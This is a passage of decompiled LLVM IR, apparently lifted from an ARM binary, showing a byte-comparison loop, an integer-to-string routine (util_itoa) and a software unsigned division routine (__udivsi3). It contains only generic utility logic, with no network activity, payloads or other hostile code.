  br i1 %v9_10784, label %dec_label_pc_107ac.preheader, label %dec_label_pc_1078c

dec_label_pc_107ac.preheader:                     ; preds = %dec_label_pc_10784
  %v2_107ac5 = icmp eq i32 %v0_107ac3, 0
  br i1 %v2_107ac5, label %dec_label_pc_107b4, label %dec_label_pc_10794

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10794, %dec_label_pc_10784
  ret i32 0

dec_label_pc_10794:                               ; preds = %dec_label_pc_107a4, %dec_label_pc_107ac.preheader
  %v0_107ac.in = phi i32 [ %v0_107ac, %dec_label_pc_107a4 ], [ %v0_107ac3, %dec_label_pc_107ac.preheader ]
  %v0_107a8 = phi i32 [ %v1_107a8, %dec_label_pc_107a4 ], [ %arg2, %dec_label_pc_107ac.preheader ]
  %v0_107a4 = phi i32 [ %v1_107a4, %dec_label_pc_107a4 ], [ %tmp, %dec_label_pc_107ac.preheader ]
  %v0_107ac = add i32 %v0_107ac.in, -1
  %v1_10794 = inttoptr i32 %v0_107a4 to i8*
  %v2_10794 = load i8, i8* %v1_10794, align 1
  %v3_10794 = zext i8 %v2_10794 to i32
  store i32 %v3_10794, i32* @r2, align 4
  %v1_10798 = inttoptr i32 %v0_107a8 to i8*
  %v2_10798 = load i8, i8* %v1_10798, align 1
  %v3_10798 = zext i8 %v2_10798 to i32
  store i32 %v3_10798, i32* @r3, align 4
  %v9_1079c = icmp eq i8 %v2_10794, %v2_10798
  br i1 %v9_1079c, label %dec_label_pc_107a4, label %dec_label_pc_1078c

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10794
  %v1_107a4 = add i32 %v0_107a4, 1
  %v1_107a8 = add i32 %v0_107a8, 1
  %v2_107ac = icmp eq i32 %v0_107ac, 0
  br i1 %v2_107ac, label %dec_label_pc_107b4, label %dec_label_pc_10794

dec_label_pc_107b4:                               ; preds = %dec_label_pc_107a4, %dec_label_pc_107ac.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10774, { 0, 1, 3, 2 }
  uselistorder i8 %v2_1073c, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_107c0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_107c0, i32* %r8.global-to-local, align 4
  %v2_107c0 = icmp eq i32 %v0_107c0, 0
  store i1 %v2_107c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_107c0, label %dec_label_pc_108a0, label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %entry
  %v3_107d0 = icmp eq i8 %arg1, 0
  store i1 %v3_107d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_107d0, label %.thread, label %dec_label_pc_107e4

.thread:                                          ; preds = %dec_label_pc_107d0
  %v4_107d8 = inttoptr i32 %v0_107c0 to i8*
  store i8 48, i8* %v4_107d8, align 1
  %v0_107dc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_107dc.pr.pr, label %.thread1, label %dec_label_pc_107e4

.thread1:                                         ; preds = %.thread
  %v4_107dc = load i32, i32* %r8.global-to-local, align 4
  %v5_107dc = add i32 %v4_107dc, 1
  %v6_107dc = inttoptr i32 %v5_107dc to i8*
  store i8 0, i8* %v6_107dc, align 1
  %v0_107e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_107e0.pr.pr, label %dec_label_pc_108a0, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107d0, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_107e8 = icmp eq i32 %arg2, 10
  store i1 %v7_107e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107e8, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_107e4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_107e4
  %v4_107e4 = zext i1 %tmp48 to i32
  store i32 %v4_107e4, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_108088 = sub nsw i32 0, %tmp
  %tmp.v3_108088 = select i1 %phitmp, i32 %tmp, i32 %v3_108088
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_108088, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10814 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10814, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10818

dec_label_pc_10818:                               ; preds = %bb46, %.thread6
  %v2_10838 = phi i32 [ %v1_10844, %bb46 ], [ 32, %.thread6 ]
  %v0_1082c = phi i32 [ %v2_1083c, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_1081c = load i32, i32* %r6.global-to-local, align 4
  %v3_10820 = urem i32 %v0_1082c, %v0_1081c
  store i32 %v3_10820, i32* %r1.global-to-local, align 4
  %v7_10824 = icmp eq i32 %v3_10820, 9
  store i1 %v7_10824, i1* %cpsr_z.global-to-local, align 1
  %v1_10828 = add i32 %v3_10820, 48
  store i32 %v0_1082c, i32* %r0.global-to-local, align 4
  %v7_10830 = icmp sgt i32 %v3_10820, 9
  %extract.t = trunc i32 %v1_10828 to i8
  br i1 %v7_10830, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10818
  %v9_10830 = add i32 %v3_10820, 55
  %extract.t28 = trunc i32 %v9_10830 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10818, %bb45
  %v0_10838.off0 = phi i8 [ %extract.t, %dec_label_pc_10818 ], [ %extract.t28, %bb45 ]
  store i32 %v0_1081c, i32* %r1.global-to-local, align 4
  %v3_10838 = load i32, i32* %r7.global-to-local, align 4
  %v4_10838 = add i32 %v3_10838, %v2_10838
  %v5_10838 = inttoptr i32 %v4_10838 to i8*
  store i8 %v0_10838.off0, i8* %v5_10838, align 1
  %v0_1083c = load i32, i32* %r0.global-to-local, align 4
  %v1_1083c = load i32, i32* %r1.global-to-local, align 4
  %v2_1083c = udiv i32 %v0_1083c, %v1_1083c
  store i32 %v2_1083c, i32* %r0.global-to-local, align 4
  %v2_10840 = icmp ugt i32 %v1_1083c, %v0_1083c
  store i1 %v2_10840, i1* %cpsr_z.global-to-local, align 1
  %v0_10844 = load i32, i32* %r5.global-to-local, align 4
  %v1_10844 = add i32 %v0_10844, -1
  store i32 %v1_10844, i32* %r5.global-to-local, align 4
  br i1 %v2_10840, label %dec_label_pc_1084c, label %dec_label_pc_10818

dec_label_pc_1084c:                               ; preds = %bb46
  %v0_1084c = load i32, i32* %sl.global-to-local, align 4
  %v2_1084c = icmp eq i32 %v0_1084c, 0
  store i1 %v2_1084c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1084c, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_1084c
  %v3_10850 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10854 = add i32 %v1_10844, %v3_10850
  store i32 %v3_10854, i32* %r2.global-to-local, align 4
  %v4_1085c = add i32 %v3_10854, -34
  %v5_1085c = inttoptr i32 %v4_1085c to i8*
  store i8 45, i8* %v5_1085c, align 1
  %v0_10860.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10860.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10860.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_1084c
  %v1_10860 = phi i32 [ %v1_10844, %dec_label_pc_1084c ], [ %v1_10860.pre, %.thread11 ]
  %v2_10860 = add i32 %v1_10860, 1
  store i32 %v2_10860, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_1086c = phi i32 [ %v2_10860, %.thread12 ], [ %v1_10860.pre, %.thread11 ]
  %v0_10864 = load i32, i32* %r7.global-to-local, align 4
  %v2_10864 = add i32 %v0_10864, %v1_1086c
  %v3_10864 = inttoptr i32 %v2_10864 to i8*
  %v4_10864 = load i8, i8* %v3_10864, align 1
  %v6_10864 = zext i8 %v4_10864 to i32
  %v2_10868 = icmp eq i8 %v4_10864, 0
  store i1 %v2_10868, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10864, i32* %r2.global-to-local, align 4
  br i1 %v2_10868, label %dec_label_pc_108b0, label %dec_label_pc_10878.preheader

dec_label_pc_10878.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10878

dec_label_pc_10878:                               ; preds = %dec_label_pc_10878.preheader, %dec_label_pc_10878
  %v0_10878 = phi i32 [ 0, %dec_label_pc_10878.preheader ], [ %v1_10878, %dec_label_pc_10878 ]
  %v1_10878 = add i32 %v0_10878, 1
  store i32 %v1_10878, i32* %r1.global-to-local, align 4
  %v2_1087c = add i32 %v1_10878, %v2_10864
  %v3_1087c = inttoptr i32 %v2_1087c to i8*
  %v4_1087c = load i8, i8* %v3_1087c, align 1
  %v2_10880 = icmp eq i8 %v4_1087c, 0
  store i1 %v2_10880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10880, label %dec_label_pc_10888, label %dec_label_pc_10878

dec_label_pc_10888:                               ; preds = %dec_label_pc_10878, %dec_label_pc_108b0
  %v0_1088c25 = phi i32 [ %v6_10864, %dec_label_pc_108b0 ], [ %v1_10878, %dec_label_pc_10878 ]
  %v0_10888 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_1088c.dec_label_pc_1088c_crit_edge, %dec_label_pc_10888
  %v2_10898 = phi i32 [ %v5_10898, %dec_label_pc_1088c.dec_label_pc_1088c_crit_edge ], [ %v0_10888, %dec_label_pc_10888 ]
  %v0_10890 = phi i32 [ %v0_10890.pre, %dec_label_pc_1088c.dec_label_pc_1088c_crit_edge ], [ %v2_10864, %dec_label_pc_10888 ]
  %v0_1088c = phi i32 [ %v0_1088c.pre, %dec_label_pc_1088c.dec_label_pc_1088c_crit_edge ], [ %v0_1088c25, %dec_label_pc_10888 ]
  %v1_1088c = add i32 %v0_1088c, -1
  store i32 %v1_1088c, i32* %r1.global-to-local, align 4
  %v1_10890 = inttoptr i32 %v0_10890 to i8*
  %v2_10890 = load i8, i8* %v1_10890, align 1
  %v5_10890 = add i32 %v0_10890, 1
  store i32 %v5_10890, i32* %r2.global-to-local, align 4
  %v3_10894 = icmp eq i32 %v0_1088c, 0
  store i1 %v3_10894, i1* %cpsr_z.global-to-local, align 1
  %v3_10898 = inttoptr i32 %v2_10898 to i8*
  store i8 %v2_10890, i8* %v3_10898, align 1
  %v4_10898 = load i32, i32* %r0.global-to-local, align 4
  %v5_10898 = add i32 %v4_10898, 1
  store i32 %v5_10898, i32* %r0.global-to-local, align 4
  br i1 %v3_10894, label %dec_label_pc_108a0, label %dec_label_pc_1088c.dec_label_pc_1088c_crit_edge

dec_label_pc_1088c.dec_label_pc_1088c_crit_edge:  ; preds = %dec_label_pc_1088c
  %v0_1088c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10890.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1088c

dec_label_pc_108a0:                               ; preds = %dec_label_pc_1088c, %.thread1, %entry
  %v0_108a0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_108a0, i32* %r0.global-to-local, align 4
  ret i32 %v0_108a0

dec_label_pc_108b0:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10864, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10888

; uselistorder directives
  uselistorder i32 %v5_10898, { 1, 0 }
  uselistorder i1 %v3_10894, { 1, 0 }
  uselistorder i32 %v0_10890, { 1, 0 }
  uselistorder i32 %v1_10878, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10864, { 1, 0 }
  uselistorder i32 %v2_10864, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10860.pre, { 1, 0 }
  uselistorder i32 %v1_10844, { 1, 0, 3, 2 }
  uselistorder i32 %v2_1083c, { 1, 0 }
  uselistorder i32 %v3_10820, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_107c0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10888, { 1, 0 }
  uselistorder label %dec_label_pc_10878, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_107e4, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_108b8 = load i32, i32* @r1, align 4
  %v1_108b8 = add i32 %v0_108b8, -1
  store i32 %v1_108b8, i32* %r2.global-to-local, align 4
  %v2_108b8 = icmp eq i32 %v0_108b8, 0
  %v7_108b8 = icmp eq i32 %v0_108b8, 1
  %v0_108bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_108b8, i32 %v0_108bc)
  br i1 %v2_108b8, label %dec_label_pc_109a0, label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %entry
  %v0_108c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_108c4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_108c4, %v1_108c4
  br i1 %tmp, label %dec_label_pc_108cc, label %dec_label_pc_10958

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108c4
  %v1_108cc = load i32, i32* %r2.global-to-local, align 4
  %v2_108cc = and i32 %v1_108cc, %v1_108c4
  %v4_108cc = icmp eq i32 %v2_108cc, 0
  br i1 %v4_108cc, label %dec_label_pc_10964, label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108cc
  %v3_108d4 = icmp ult i32 %v1_108c4, 536870912
  br i1 %v3_108d4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_108d4
  %v4_108d8 = mul i32 %v1_108c4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_108d4, %.thread
  %v0_108f8.pr36.ph = phi i32 [ %v4_108d8, %.thread ], [ %v1_108c4, %dec_label_pc_108d4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_108d4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_108f8.pr36 = phi i32 [ %v4_108ec, %bb81 ], [ %v0_108f8.pr36.ph, %.preheader.preheader ]
  %v1_108f0 = phi i32 [ %v4_108f0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_108e4 = icmp ugt i32 %v0_108f8.pr36, 268435455
  br i1 %v2_108e4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_108f8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_108e8 = icmp ult i32 %v0_108f8.pr36, %v0_108c4
  br i1 %v4_108e8, label %bb80, label %dec_label_pc_108f8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_108ec = and i32 %v0_108f8.pr36, 268435456
  %v3_108ec = icmp eq i32 %v2_108ec, 0
  %v4_108ec = mul i32 %v0_108f8.pr36, 16
  br i1 %v3_108ec, label %bb81, label %dec_label_pc_108f8.loopexit

bb81:                                             ; preds = %bb80
  %v2_108f0 = and i32 %v1_108f0, 268435456
  %v3_108f0 = icmp eq i32 %v2_108f0, 0
  %v4_108f0 = mul i32 %v1_108f0, 16
  br i1 %v3_108f0, label %.preheader, label %dec_label_pc_108f8thread-pre-split.loopexit.loopexit

dec_label_pc_108f8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1090448.ph = phi i32 [ %v1_108f0, %bb ], [ %v4_108f0, %bb81 ]
  %v0_108f8.pr38.ph = phi i32 [ %v0_108f8.pr36, %bb ], [ %v4_108ec, %bb81 ]
  br label %dec_label_pc_108f8thread-pre-split.loopexit

dec_label_pc_108f8thread-pre-split.loopexit:      ; preds = %dec_label_pc_108f8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1090448 = phi i32 [ %v1_108f0, %.thread2 ], [ %v1_1090448.ph, %dec_label_pc_108f8thread-pre-split.loopexit.loopexit ]
  %v0_108f8.pr38 = phi i32 [ %v0_108f8.pr36, %.thread2 ], [ %v0_108f8.pr38.ph, %dec_label_pc_108f8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_108f8thread-pre-split

dec_label_pc_108f8thread-pre-split:               ; preds = %dec_label_pc_108f8thread-pre-split.loopexit, %bb83
  %v1_1090446 = phi i32 [ %v1_1090448, %dec_label_pc_108f8thread-pre-split.loopexit ], [ %v3_10904, %bb83 ]
  %v0_108f8.pr = phi i32 [ %v0_108f8.pr38, %dec_label_pc_108f8thread-pre-split.loopexit ], [ %v3_10900, %bb83 ]
  br label %dec_label_pc_108f8

dec_label_pc_108f8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_108f8

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108f8.loopexit, %dec_label_pc_108f8thread-pre-split
  %v1_10904 = phi i32 [ %v1_1090446, %dec_label_pc_108f8thread-pre-split ], [ %v1_108f0, %dec_label_pc_108f8.loopexit ]
  %v1_10900 = phi i32 [ %v0_108f8.pr, %dec_label_pc_108f8thread-pre-split ], [ %v4_108ec, %dec_label_pc_108f8.loopexit ]
  %v2_108f8 = icmp slt i32 %v1_10900, 0
  br i1 %v2_108f8, label %dec_label_pc_1090c, label %bb82

bb82:                                             ; preds = %dec_label_pc_108f8
  %v4_108fc = icmp ult i32 %v1_10900, %v0_108c4
  br i1 %v4_108fc, label %bb83, label %dec_label_pc_1090c

bb83:                                             ; preds = %bb82
  %v3_10900 = mul i32 %v1_10900, 2
  %v2_10904 = icmp slt i32 %v1_10904, 0
  %v3_10904 = mul i32 %v1_10904, 2
  br i1 %v2_10904, label %dec_label_pc_1090c, label %dec_label_pc_108f8thread-pre-split

dec_label_pc_1090c:                               ; preds = %bb82, %dec_label_pc_108f8, %bb83
  %v2_1091859 = phi i32 [ %v3_10904, %bb83 ], [ %v1_10904, %bb82 ], [ %v1_10904, %dec_label_pc_108f8 ]
  %v1_1091051 = phi i32 [ %v3_10900, %bb83 ], [ %v1_10900, %bb82 ], [ %v1_10900, %dec_label_pc_108f8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10910

dec_label_pc_10910:                               ; preds = %.thread11, %dec_label_pc_1090c
  %v1_10944 = phi i32 [ %v4_10944, %.thread11 ], [ %v2_1091859, %dec_label_pc_1090c ]
  %v1_10918 = phi i32 [ %v0_10950, %.thread11 ], [ 0, %dec_label_pc_1090c ]
  %v1_10948 = phi i32 [ %v4_10948, %.thread11 ], [ %v1_1091051, %dec_label_pc_1090c ]
  %v1_10914 = phi i32 [ %v0_10940, %.thread11 ], [ %v0_108c4, %dec_label_pc_1090c ]
  %v3_10910 = icmp ult i32 %v1_10914, %v1_10948
  br i1 %v3_10910, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10910
  %v3_10914 = sub i32 %v1_10914, %v1_10948
  store i32 %v3_10914, i32* %r0.global-to-local, align 4
  %v3_10918 = or i32 %v1_10918, %v1_10944
  store i32 %v3_10918, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10910, %bb84
  %v1_10920 = phi i32 [ %v1_10914, %dec_label_pc_10910 ], [ %v3_10914, %bb84 ]
  %v1_10924 = phi i32 [ %v1_10918, %dec_label_pc_10910 ], [ %v3_10918, %bb84 ]
  %v4_1091c = udiv i32 %v1_10948, 2
  %v6_1091c = icmp ult i32 %v1_10920, %v4_1091c
  br i1 %v6_1091c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10920 = urem i32 %v1_10948, 2
  %v4_10920 = icmp eq i32 %v3_10920, 0
  %v6_10920 = sub i32 %v1_10920, %v4_1091c
  store i32 %v6_10920, i32* %r0.global-to-local, align 4
  br i1 %v4_10920, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10924 = udiv i32 %v1_10944, 2
  %v6_10924 = or i32 %v1_10924, %v5_10924
  store i32 %v6_10924, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1092c = phi i32 [ %v6_10920, %bb85 ], [ %v1_10920, %.thread7 ], [ %v6_10920, %bb86 ]
  %v1_10930 = phi i32 [ %v1_10924, %bb85 ], [ %v1_10924, %.thread7 ], [ %v6_10924, %bb86 ]
  %v4_10928 = udiv i32 %v1_10948, 4
  %v6_10928 = icmp ult i32 %v1_1092c, %v4_10928
  br i1 %v6_10928, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1092c = and i32 %v1_10948, 2
  %v4_1092c = icmp eq i32 %v3_1092c, 0
  %v6_1092c = sub i32 %v1_1092c, %v4_10928
  store i32 %v6_1092c, i32* %r0.global-to-local, align 4
  br i1 %v4_1092c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10930 = udiv i32 %v1_10944, 4
  %v6_10930 = or i32 %v1_10930, %v5_10930
  store i32 %v6_10930, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_10938 = phi i32 [ %v6_1092c, %bb87 ], [ %v1_1092c, %.thread8 ], [ %v6_1092c, %bb88 ]
  %v1_1093c = phi i32 [ %v1_10930, %bb87 ], [ %v1_10930, %.thread8 ], [ %v6_10930, %bb88 ]
  %v4_10934 = udiv i32 %v1_10948, 8
  %v6_10934 = icmp ult i32 %v1_10938, %v4_10934
  br i1 %v6_10934, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_10938 = and i32 %v1_10948, 4
  %v4_10938 = icmp eq i32 %v3_10938, 0
  %v6_10938 = sub i32 %v1_10938, %v4_10934
  store i32 %v6_10938, i32* %r0.global-to-local, align 4
  br i1 %v4_10938, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1093c = udiv i32 %v1_10944, 8
  %v6_1093c = or i32 %v1_1093c, %v5_1093c
  store i32 %v6_1093c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10950 = phi i32 [ %v1_1093c, %bb89 ], [ %v1_1093c, %.thread9 ], [ %v6_1093c, %bb90 ]
  %v0_10940 = phi i32 [ %v6_10938, %bb89 ], [ %v1_10938, %.thread9 ], [ %v6_10938, %bb90 ]
  %v2_10940 = icmp eq i32 %v0_10940, 0
  br i1 %v2_10940, label %dec_label_pc_10950, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10944, 16
  br i1 %tmp138, label %dec_label_pc_10950, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10944 = udiv i32 %v1_10944, 16
  %v4_10948 = udiv i32 %v1_10948, 16
  br label %dec_label_pc_10910

dec_label_pc_10950:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10950, i32* %r0.global-to-local, align 4
  ret i32 %v0_10950

dec_label_pc_10958:                               ; preds = %dec_label_pc_108c4
  %v9_108c4 = icmp eq i32 %v0_108c4, %v1_108c4
  %. = zext i1 %v9_108c4 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10964:                               ; preds = %dec_label_pc_108cc
  %v2_10964 = icmp ugt i32 %v1_108c4, 65535
  br i1 %v2_10964, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10964
  %v2_10968 = and i32 %v1_108c4, 32768
  %v3_10968 = icmp eq i32 %v2_10968, 0
  %v4_10968 = udiv i32 %v1_108c4, 65536
  br i1 %v3_10968, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10964
  %v0_1097465 = phi i32 [ %v1_108c4, %dec_label_pc_10964 ], [ %v4_10968, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10978 = phi i32 [ %v0_1097465, %.thread16 ], [ %v4_10968, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10974 = icmp ugt i32 %v1_10978, 255
  br i1 %v2_10974, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10978 = and i32 %v1_10978, 128
  %v3_10978 = icmp eq i32 %v2_10978, 0
  %v4_10978 = udiv i32 %v1_10978, 256
  br i1 %v3_10978, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_1097c = or i32 %storemerge, 8
  store i32 %v2_1097c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10988 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_1097c, %bb98 ]
  %v1_10984 = phi i32 [ %v1_10978, %bb96 ], [ %v4_10978, %bb97 ], [ %v4_10978, %bb98 ]
  %v2_10980 = icmp ugt i32 %v1_10984, 15
  br i1 %v2_10980, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10984 = and i32 %v1_10984, 8
  %v3_10984 = icmp eq i32 %v2_10984, 0
  %v4_10984 = udiv i32 %v1_10984, 16
  br i1 %v3_10984, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10988 = add nsw i32 %v1_10988, 4
  store i32 %v2_10988, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10990 = phi i32 [ %v1_10988, %.thread17 ], [ %v1_10988, %bb99 ], [ %v2_10988, %bb100 ]
  %v5_10994 = phi i32 [ %v1_10984, %.thread17 ], [ %v4_10984, %bb99 ], [ %v4_10984, %bb100 ]
  %v2_1098c = icmp ugt i32 %v5_10994, 3
  %v7_1098c = icmp eq i32 %v5_10994, 4
  %v2_10990 = xor i1 %v7_1098c, true
  %v3_10990 = and i1 %v2_1098c, %v2_10990
  br i1 %v3_10990, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10990 = add nsw i32 %v4_10990, 3
  store i32 %v5_10990, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10994 = phi i32 [ %v4_10990, %.thread18 ], [ %v5_10990, %bb101 ]
  %v2_10994 = xor i1 %v2_1098c, true
  %v3_10994 = or i1 %v7_1098c, %v2_10994
  br i1 %v3_10994, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10994 = udiv i32 %v5_10994, 2
  %v9_10994 = add i32 %v4_10994, %v8_10994
  store i32 %v9_10994, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10998 = phi i32 [ %v4_10994, %bb102 ], [ %v9_10994, %bb103 ]
  %v6_10998 = lshr i32 %v0_108c4, %v1_10998
  store i32 %v6_10998, i32* %r0.global-to-local, align 4
  ret i32 %v6_10998

dec_label_pc_109a0:                               ; preds = %entry
  %v0_109a4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10994, { 1, 0 }
  uselistorder i1 %v7_1098c, { 1, 0 }
  uselistorder i32 %v4_10984, { 1, 0 }
  uselistorder i32 %v1_10984, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1097c, { 1, 0 }
  uselistorder i32 %v4_10978, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10978, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10968, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10940, { 1, 0 }
